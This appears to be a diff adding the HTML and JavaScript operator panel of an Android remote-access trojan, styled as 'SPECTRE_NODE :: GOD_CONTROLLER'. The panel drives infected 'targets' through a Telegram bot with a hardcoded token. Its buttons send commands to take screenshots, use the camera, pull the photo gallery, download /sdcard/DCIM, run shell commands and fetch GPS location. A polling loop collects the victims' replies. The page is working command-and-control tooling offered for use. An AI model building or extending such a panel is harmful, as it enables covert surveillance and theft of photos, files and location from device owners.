@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>// SPECTRE_NODE :: GOD_CONTROLLER //</title>
+<style>
+/* Full advanced hacker theme (same as before) – compressed for space */
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
+:root{--bg:#0a0b0f;--panel:#0d1117;--border:#1e2a3a;--text:#c9d1d9;--sec:#8b949e;--red:#ff3366;--cyan:#00f0ff;--gold:#ffb800;--green:#00ff66;--glow1:#ff336640;--glow2:#00f0ff40;--grad:linear-gradient(90deg,#ff3366,#ff6633,#ffb800);--font:'JetBrains Mono',monospace}
+*{margin:0;padding:0;box-sizing:border-box}body{background:var(--bg);color:var(--text);font-family:var(--font);height:100vh;overflow:hidden;user-select:none}
+body::after{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,.15) 0px,rgba(0,0,0,.15) 1px,transparent 1px,transparent 3px);pointer-events:none;z-index:999}
+#app{display:grid;grid-template-rows:auto auto 1fr;height:100vh;gap:2px;background:var(--border);border:1px solid var(--border)}
+.header{background:linear-gradient(135deg,#0a0b0f,#1a1f2e);padding:15px 25px;border-bottom:2px solid var(--red);display:flex;align-items:center;justify-content:space-between;position:relative;overflow:hidden}
+.header::before{content:"";position:absolute;top:0;left:0;width:200%;height:2px;background:var(--grad);animation:scan 3s linear infinite}
+@keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+.logo{width:45px;height:45px;border:2px solid var(--cyan);border-radius:3px;display:flex;align-items:center;justify-content:center;background:rgba(0,240,255,.05);box-shadow:0 0 20px var(--glow2),inset 0 0 10px var(--glow2);animation:pulseLogo 2s ease-in-out infinite}
+@keyframes pulseLogo{0%,100%{box-shadow:0 0 20px var(--glow2),inset 0 0 10px var(--glow2)}50%{box-shadow:0 0 40px var(--glow2),inset 0 0 20px var(--glow2)}}
+.logo svg{width:25px;height:25px;fill:var(--cyan)}
+.title h1{font-size:22px;font-weight:700;letter-spacing:3px;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-transform:uppercase}
+.title .sub{font-size:10px;color:var(--sec);letter-spacing:5px;margin-top:2px}
+.stats{display:flex;gap:20px;align-items:center}
+.stat{text-align:center}.stat .val{font-size:20px;font-weight:700;color:var(--cyan);text-shadow:0 0 10px var(--glow2)}.stat .lbl{font-size:8px;color:var(--sec);letter-spacing:2px;text-transform:uppercase}
+.pills{background:var(--panel);padding:8px 20px;display:flex;gap:5px;border-bottom:1px solid var(--border);overflow-x:auto}
+.pill{padding:6px 14px;border:1px solid var(--border);border-radius:20px;font-size:10px;font-weight:600;letter-spacing:1.5px;cursor:pointer;transition:all .2s;white-space:nowrap;text-transform:uppercase;background:var(--panel);color:var(--sec)}
+.pill:hover{border-color:var(--cyan);color:var(--cyan);box-shadow:0 0 15px var(--glow2)}.pill.red{border-color:var(--red);color:var(--red)}.pill.red:hover{box-shadow:0 0 15px var(--glow1)}.pill.green{border-color:var(--green);color:var(--green)}.pill.gold{border-color:var(--gold);color:var(--gold)}
+.main{display:grid;grid-template-columns:280px 1fr;gap:2px;background:var(--border);flex:1}
+.targets{background:var(--panel);display:flex;flex-direction:column}
+.panel-head{padding:12px 15px;border-bottom:1px solid var(--border);font-size:10px;letter-spacing:3px;color:var(--sec);text-transform:uppercase;background:#111820;display:flex;justify-content:space-between;align-items:center}
+.panel-head .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px rgba(0,255,102,.6);animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.tlist{flex:1;overflow-y:auto;padding:8px}
+.titem{padding:12px;margin-bottom:6px;border:1px solid var(--border);border-radius:4px;cursor:pointer;transition:all .25s;background:#111820}
+.titem:hover{border-color:var(--cyan);background:rgba(0,240,255,.03)}
+.titem.active{border-color:var(--cyan);box-shadow:0 0 20px var(--glow2),inset 0 0 15px rgba(0,240,255,.05);background:rgba(0,240,255,.05)}
+.titem .tid{font-size:13px;font-weight:600;display:flex;align-items:center;gap:8px}
+.titem .indicator{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.titem.online .indicator{background:var(--green);box-shadow:0 0 10px rgba(0,255,102,.8)}
+.titem.offline .indicator{background:var(--red);box-shadow:0 0 10px rgba(255,51,102,.8)}
+.titem .meta{font-size:9px;color:var(--sec);margin-top:6px;letter-spacing:1px}
+.console{background:#000;display:flex;flex-direction:column;position:relative;overflow:hidden}
+.chead{padding:10px 15px;border-bottom:1px solid var(--border);font-size:10px;letter-spacing:3px;color:var(--sec);background:#0a0a0a;display:flex;gap:20px}
+.chead span{color:var(--cyan)}
+.cbody{flex:1;overflow-y:auto;padding:10px 15px;font-size:11px;line-height:1.8}
+.log{display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.02)}.log .time{color:#555}.log .dev{color:var(--cyan);font-weight:600}.log .text{color:var(--sec);word-break:break-all}
+.log.cmd{border-left:2px solid var(--gold);padding-left:8px}.log.cmd .text{color:var(--gold)}
+.input{display:flex;border-top:1px solid var(--border);background:#0a0a0a;align-items:center}
+.prompt{padding:0 12px;color:var(--green);font-size:13px;font-weight:700}
+.input input{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:12px;padding:12px 5px;outline:none;letter-spacing:1px}
+.input input::placeholder{color:#333}
+.input button{background:var(--red);color:#fff;border:none;padding:12px 25px;font-family:var(--font);font-size:11px;font-weight:700;letter-spacing:2px;cursor:pointer;text-transform:uppercase;transition:background .2s}
+.input button:hover{background:#ff1a4d}
+#particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:#000}::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}::-webkit-scrollbar-thumb:hover{background:var(--cyan)}
+#loading{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center}.loading-ring{width:60px;height:60px;border:3px solid #1a1a1a;border-top-color:var(--cyan);border-radius:50%;animation:spin 1s linear infinite}.loading-text{margin-top:25px;color:var(--sec);letter-spacing:5px;font-size:11px}@keyframes spin{100%{transform:rotate(360deg)}}.hidden{display:none!important}
+</style>
+</head>
+<body>
+<canvas id="particles"></canvas>
+<div id="loading"><div class="loading-ring"></div><div class="loading-text">SPECTRE_NODE :: INITIALIZING</div></div>
+<div id="app" class="hidden">
+  <div class="header">
+    <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div>
+    <div class="title"><h1>SPECTRE_NODE</h1><div class="sub">// GOD_CONTROLLER v3.7 //</div></div>
+    <div class="stats">
+      <div class="stat"><div class="val" id="onlineCount">0</div><div class="lbl">Online</div></div>
+      <div class="stat"><div class="val" id="totalCount">0</div><div class="lbl">Targets</div></div>
+      <div class="stat"><div class="val" id="cmdCount">0</div><div class="lbl">Commands</div></div>
+      <div class="stat"><div class="val" id="uptime">00:00</div><div class="lbl">Uptime</div></div>
+    </div>
+  </div>
+  <div class="pills">
+    <div class="pill red" onclick="sendCmd('/screenshot')">📸 Screenshot</div>
+    <div class="pill green" onclick="sendCmd('/camera')">📷 Camera</div>
+    <div class="pill" onclick="sendCmd('/gallery')">🖼 Gallery</div>
+    <div class="pill gold" onclick="sendCmd('/download /sdcard/DCIM')">📥 Photos</div>
+    <div class="pill" onclick="sendCmd('/shell ls /sdcard')">📂 Files</div>
+    <div class="pill red" onclick="sendCmd('/location')">📍 GPS</div>
+  </div>
+  <div class="main">
+    <div class="targets">
+      <div class="panel-head">[ NODES ] <span class="dot"></span></div>
+      <div class="tlist" id="devices"></div>
+    </div>
+    <div class="console">
+      <div class="chead"><span>➜</span> TERMINAL OUTPUT <span>// spectre@god:~#</span></div>
+      <div class="cbody" id="console"><div class="log"><span class="time">--:--:--</span><span class="dev">SYSTEM</span><span class="text">Spectre Node initialized. Awaiting target connections...</span></div></div>
+      <div class="input"><span class="prompt">❯</span><input id="cmdInput" placeholder="enter command..." onkeypress="if(event.key==='Enter')sendCmdFromInput()"><button onclick="sendCmdFromInput()">Execute</button></div>
+    </div>
+  </div>
+</div>
+<script>
+// Particle background (abbreviated)
+const canvas=document.getElementById('particles'),ctx=canvas.getContext('2d');canvas.width=window.innerWidth;canvas.height=window.innerHeight;const particles=[];for(let i=0;i<80;i++)particles.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,vx:(Math.random()-0.5)*0.5,vy:(Math.random()-0.5)*0.5,size:Math.random()*2,alpha:Math.random()*0.5});function anim(){ctx.clearRect(0,0,canvas.width,canvas.height);particles.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0||p.x>canvas.width)p.vx*=-1;if(p.y<0||p.y>canvas.height)p.vy*=-1;ctx.fillStyle=`rgba(0,240,255,${p.alpha})`;ctx.beginPath();ctx.arc(p.x,p.y,p.size,0,Math.PI*2);ctx.fill()});for(let i=0;i<particles.length;i++)for(let j=i+1;j<particles.length;j++){const dx=particles[i].x-particles[j].x,dy=particles[i].y-particles[j].y,dist=Math.sqrt(dx*dx+dy*dy);if(dist<100){ctx.strokeStyle=`rgba(0,240,255,${0.08*(1-dist/100)})`;ctx.lineWidth=0.5;ctx.beginPath();ctx.moveTo(particles[i].x,particles[i].y);ctx.lineTo(particles[j].x,particles[j].y);ctx.stroke()}}requestAnimationFrame(anim)}anim();
+
+// Telegram interaction
+const BOT_TOKEN = "8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk";
+const CHANNEL_ID = -1001234567890;  // Replace with your channel ID
+const ADMIN_ID = 6732091734;
+const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+let selectedDevice = null, devices = {}, cmdCounter = 0, offset = 0;
+const startTime = Date.now();
+
+// Send command to channel (via bot posting)
+async function sendCmd(cmd) {
+  if (!selectedDevice) return alert("Select a target first");
+  const text = `${selectedDevice} ${cmd}`;  // prefix with device id so target knows it's for them
+  await fetch(`${API}/sendMessage`, {
+    method: "POST", headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({chat_id: CHANNEL_ID, text: text})
+  });
+  addLog("YOU", cmd, true);
+  cmdCounter++; document.getElementById('cmdCount').textContent = cmdCounter;
+}
+
+function sendCmdFromInput() {
+  const cmd = document.getElementById('cmdInput').value;
+  if (cmd) { sendCmd(cmd); document.getElementById('cmdInput').value = ''; }
+}
+
+// Poll for updates from target (messages sent by bot to admin)
+async function poll() {
+  while (true) {
+    try {
+      const resp = await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);
+      const data = await resp.json();
+      if (data.result) {
+        for (const upd of data.result) {
+          offset = upd.update_id + 1;
+          const msg = upd.message;
+          if (msg && msg.chat && msg.chat.id === ADMIN_ID) {
+            const text = msg.text || "[file]";
+            const deviceId = text.split("]")[0].replace("[", "");
+            if (deviceId && devices[deviceId]) {
+              addLog(deviceId, text.substring(deviceId.length+2));
+            }
+            // If document, handle separately (not shown for brevity)
+          }
+        }
+      }
+    } catch(e) {}
+    await new Promise(r => setTimeout(r, 5000));
+  }
+}
+poll();
+
+function addLog(device, text, isCmd = false) {
+  const consoleDiv = document.getElementById('console');
+  const time = new Date().toLocaleTimeString('en-US', {hour12: false});
+  const div = document.createElement('div');
+  div.className = `log${isCmd ? ' cmd' : ''}`;
+  div.innerHTML = `<span class="time">${time}</span><span class="dev">${device}</span><span class="text">${text}</span>`;
+  consoleDiv.appendChild(div);
+  consoleDiv.scrollTop = consoleDiv.scrollHeight;
+}
+
+// Simulate device list (in real use, target registers by sending a heartbeat; for now we manually add)
+function addDevice(deviceId) {
+  if (!devices[deviceId]) {
+    devices[deviceId] = {online: true};
+    document.getElementById('devices').innerHTML = Object.entries(devices).map(([id, d]) =>
+      `<div class="titem online${selectedDevice===id?' active':''}" onclick="selectDevice('${id}')"><div class="tid"><span class="indicator"></span>${id}</div><div class="meta">LINK ESTABLISHED | ANDROID</div></div>`
+    ).join('');
+    document.getElementById('onlineCount').textContent = Object.values(devices).filter(d => d.online).length;
+    document.getElementById('totalCount').textContent = Object.keys(devices).length;
+  }
+}
+function selectDevice(id) {
+  selectedDevice = id;
+  document.querySelectorAll('.titem').forEach(el => el.classList.remove('active'));
+  const items = document.querySelectorAll('.titem');
+  items.forEach(el => { if (el.querySelector('.tid').textContent.includes(id.split(':')[0])) el.classList.add('active'); });
+}
+// For demo, add a dummy device; in production, target would register by sending a message
+addDevice("Demo_Device");
+
+// Uptime
+setInterval(() => {
+  const elapsed = Math.floor((Date.now() - startTime) / 1000);
+  const h = Math.floor(elapsed/3600).toString().padStart(2,'0');
+  const m = Math.floor((elapsed%3600)/60).toString().padStart(2,'0');
+  const s = (elapsed%60).toString().padStart(2,'0');
+  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
+}, 1000);
+
+// Remove loading screen
+setTimeout(() => {
+  document.getElementById('loading').classList.add('hidden');
+  document.getElementById('app').classList.remove('hidden');
+}, 2000);
+</script>
+</body>
+</html>
